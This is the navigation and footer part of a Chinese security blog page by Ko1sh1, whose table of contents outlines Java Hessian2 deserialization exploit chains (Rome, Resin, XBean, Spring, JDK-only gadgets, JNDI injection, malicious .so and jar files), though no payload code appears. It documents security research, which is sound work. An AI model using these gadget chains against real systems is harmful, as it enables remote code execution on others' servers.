        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%EF%BC%88%E4%BA%86%E8%A7%A3%E5%8D%B3%E5%8F%AF%EF%BC%89"><span class="nav-text">反序列化机制（了解即可）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EBean%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6"><span class="nav-text">基于Bean属性访问机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EField%E6%9C%BA%E5%88%B6"><span class="nav-text">基于Field机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hessian2-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95"><span class="nav-text">Hessian2 序列化与反序列化简单测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hessian2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">Hessian2 反序列化漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%92%E7%BA%B3"><span class="nav-text">归纳</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rome-%E9%85%8D%E5%90%88-Hessian2"><span class="nav-text">Rome 配合 Hessian2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93-jndi-%E6%B3%A8%E5%85%A5"><span class="nav-text">打 jndi 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%9A%A9%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%88%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89"><span class="nav-text">🚩加载字节码（二次反序列化）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#java-security-SignedObject"><span class="nav-text">java.security.SignedObject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-SignedObject-%E5%AF%B9%E8%B1%A1"><span class="nav-text">获取 SignedObject 对象</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Resin-%E9%85%8D%E5%90%88-Hessian2"><span class="nav-text">Resin 配合 Hessian2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-QName-toString%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="nav-text">分析-QName toString远程类加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-1"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%87%E8%91%A9%E9%97%AE%E9%A2%98%E7%AA%A5%E6%8E%A2"><span class="nav-text">奇葩问题窥探</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="nav-text">针对第一个问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E7%AC%AC%E4%BA%8C%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="nav-text">针对第二个问题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XBean-%E9%85%8D%E5%90%88-Hessian2%EF%BC%88%E8%BF%98%E6%98%AF%E9%9C%80%E8%A6%81spring%EF%BC%89"><span class="nav-text">XBean 配合 Hessian2（还是需要spring）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-Binding-toString%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="nav-text">分析-Binding toString远程类加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-2"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HotSwappableTargetSource-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E5%BD%92%E7%BA%B3"><span class="nav-text">HotSwappableTargetSource 利用思路归纳</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Spring-Context-AOP"><span class="nav-text">Spring Context &amp; AOP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PartiallyComparableAdvisorHolder"><span class="nav-text">PartiallyComparableAdvisorHolder</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%9A%A9-OnlyJDK-%E5%88%A9%E7%94%A8-%E9%87%8D%E8%A6%81-%F0%9F%9A%A9"><span class="nav-text">🚩 OnlyJDK 利用(重要)🚩</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93%E5%88%A9%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BBtoString%E2%80%93"><span class="nav-text">–利用任意类toString–</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="nav-text">前情提要</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A0MethodUtils-invoke"><span class="nav-text">①MethodUtils  invoke</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-3"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">调用链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%9A%A9%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93-UIDefaults-SwingLazyValue%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95"><span class="nav-text">🚩部分总结-UIDefaults&amp;SwingLazyValue执行任意静态方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A1InitalContext-doLookup"><span class="nav-text">②InitalContext.doLookup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-4"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A2DumpBytecode-dumpBytecode-System-load"><span class="nav-text">③DumpBytecode.dumpBytecode + System.load</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F-so-%E6%96%87%E4%BB%B6"><span class="nav-text">生成恶意 so 文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-5"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A3JavaWrapper-mian"><span class="nav-text">④JavaWrapper._mian</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-6"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A4System-setProperty-writeGeneratedAsm-sun-security-tools-keytool-Main-main"><span class="nav-text">⑤System.setProperty + writeGeneratedAsm + sun.security.tools.keytool.Main.main</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8Fjar"><span class="nav-text">恶意jar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-7"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A5sun-tools-jar-Main-main-sun-security-tools-keytool-Main-main"><span class="nav-text">⑥sun.tools.jar.Main.main + sun.security.tools.keytool.Main.main</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-8"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E6%95%88%E6%9E%9C"><span class="nav-text">触发效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A6com-sun-org-apache-xalan-internal-xslt-Process-main"><span class="nav-text">⑦com.sun.org.apache.xalan.internal.xslt.Process._main</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-9"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93%E5%88%A9%E7%94%A8%E7%89%B9%E5%AE%9A%E7%B1%BB%E7%9A%84-equals-%E6%96%B9%E6%B3%95%E2%80%93"><span class="nav-text">–利用特定类的 equals 方法–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="nav-text">简单分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload1"><span class="nav-text">payload1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload2"><span class="nav-text">payload2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload3"><span class="nav-text">payload3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload4"><span class="nav-text">payload4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%9A%A9%E7%89%B9%E5%AE%9A%E6%83%85%E5%86%B5%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E2%80%93-UnixPrintService"><span class="nav-text">🚩特定情况下命令执行 – UnixPrintService</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共 14 篇文章
                    </span>
                    
                        <span>
                            共 128.2k 字
                        </span>
                    
                </p>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
            
                
        
                
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>



<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
